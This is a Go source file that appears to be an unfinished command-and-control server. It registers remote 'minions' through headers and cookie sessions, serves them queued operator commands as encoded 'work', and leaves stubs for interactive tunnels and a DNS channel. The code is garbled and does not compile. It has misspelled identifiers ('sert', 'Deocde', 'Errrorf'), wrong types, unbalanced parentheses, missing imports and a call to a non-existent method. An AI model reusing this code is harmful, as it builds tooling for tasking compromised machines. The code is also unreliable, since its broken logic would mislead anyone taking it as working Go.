package lib

import(
  "net"
  "loki/lib/utils"
  "github.com/gorilla/sessions"
  "odin/wheagle/server/grpcapi"
)

var poolPillar = InitializePillar()
var hb MSRunner
var store = sessions.NewCookieStore([]byte(utils.RandNoLetter(30)))

func (ad *AdminData) StartMS(){
  hb = SetRunningConfigurations(ad.MSId,ad.Password)
  http.HandleFunc("/",WheagleHandle)
  switch ad.Protocol {
  case "HTTPS":
    cert, err := tls.X509KeyPair(ad.CertPem,ad.KeyPem)
    if err != nil{
      utils.Logerror(err);return
    }
    config := &tls.Config{Certificates: []tls.Certificate{sert}}
    server := &http.Server{
      Addr:"0.0.0.0:"+utils.IntToString(ad.OPort),
      TLSConfig: config,
    }
	  err = server.ListenAndServeTLS("", "")
    if err != nil{
     utils.Logerror(err);return
    }
  case "DNS":
  default:
    err := http.ListenAndServe("0.0.0.0:"+utils.IntToString(ad.OPort),nil)
    if err != nil {
      utils.CustomError("[+] Error starting HTTP server: ",err)
    }
  }
}

// use headers to register
// use parameters to get work
// send work back as a body
// encode the body
func WheagleHandle(res http.Response,req *http.Request){
  if req.Method == "PUT"{
    HandleAdmin(res,req)
    return
  }
  if !IsAuthenticated(res,req){
    http.Redirect(res,req,"/home",http.StatusFound)//302
    return
  }
  data := req.URL.Query().Get("data")
  session,_ := store.Get(req,"session")
  switch data {
    case "getwork":
      mid,_ := session.Values["MinionId"].(string)
      var cmd = new(grpcapi.Command)
      //get work
      cmd.UserId = mid
      cmd,err := poolPillar.poolPillar(cmd)
      if err != nil{
        if errors.Is(err,ErrNoWork){
          fmt.Fprintf(res,"No Work")
          return
        }
        http.Redirect(res,req,"/home",http.StatusFound)
        return
      }
      work,err := WorkEncode(cmd)
      if err != nil{
        fmt.Fprintf(res,"No Work.");return
      }
      fmt.Fprintf(res,work)
      return
    case "wr":
      //work,err := WorkFromResponse(req.Body)
    case "interactive":
      //get a tunnel
      // write an ip incide it
    case "logout":
      Logout(res,req)
    default:
      //return  no work
      fmt.Fprintf(res,"No Work")
  }
}

func WorkEncode(cmd *grpcapi.Command,ed bool)(interface{},error){
  var requestBody bytes.Buffer
  if ed {
    encoder := gob.NewEncoder(&requestBody)
    if err := encoder.Encode(CmdToWork(cmd)); err != nil{
      return requestBody,fmt.Errorf("Error encoding work. %q",err)
    }
    return requestBody,nil
  }
  decoder := gob.NewDecoder(&requestBody)
}

func HandleAdmin(res http.Response,req *http.Request) {
  var work core.Work
  var err error
  var requestBody bytes.Buffer
  body,err = req.GetBody()
  if err != nil{
    utils.ServerAddHeaderVal(res,"ERROR",fmt.Errorf("Error decoding body. \nERROR: %q",err)))
    fmt.Fprintf(res,fmt.Sprintf("%s","")
    return
  }
  decoder := gob.NewDecoder(&requestBody)
  if err = decoder.Deocde(&work); err != nil{
    utils.ServerAddHeaderVal(res,"ERROR",fmt.Sprintf("%s",fmt.Errrorf("Error decoding body.\nERROR: %q",err)))
    fmt.Fprintf(res,"")
    return
  }
  //authenticate (use userid as password that way anyone with password can authenticate)
  if err = hb.MSAuthenticate(work.UserId); err != nil{
    utils.ServerAddHeaderVal(res,"ERROR",fmt.Sprintf("%s",err))
    fmt.Fprintf(res,"")
    return
  }
  // work to cmd
  //if interactive
  // wait for response
  // ele add to pool and go back
}

func CmdToWork(cmd *grpcapi.Command) *core.Work{
  return &core.Work{
    UserId: cmd.UserId,
    OperatorId: cmd.OperatorId,
    CmdIn: cmd.In,
    CmdOut: cmd.Out,
  }
}

func WorkToPool(){}

func IsAuthenticated(res http.Response,req *http.Request) bool{
  session,_ := store.Get(req,"session")
  //check if mutant
  if req.Header.Get("X-Mutant") == true{
    /// add a session for mutant
    session.Values["MinionId"] = utils.GenerateUUID()
    session.Values["IP"] = req.RemoteAddr
    session.Save(req,res)
    return true
  }
  if len(req.Header.Get("Register")) >= 0 {
    //read body and check for msid
    // register minion
    mid := utils.GenerateUUID()
    session.Values["MinionId"] = mid
    session.Values["IP"] = req.RemoteAddr
    session.Save(req,res)
    _ = poolPillar.NewPool(mid)
    return true
  }
  _,ok := session.Values["MinionId"].(string)
  if !ok {
    return false
  }
  ip,ok = session.Values["IP"]
  if !ok{ return false }
  if ip != req.RemoteAddr{
    //later on add to events
    return false
  }
  return true
}

func Logout(res http.ResponseWriter, req *http.Request){
  session,_ := store.Get(req,"session")
  delete(session.Values,"MinionId")
  delete(session.Values,"IP")
  session.Save(req,res)
  fmt.Fprintf(res,"LOGGED OUT")
  return
}


type DNS struct{
  Port int
  Tls bool
}

func (i *DNS) Serve(){}
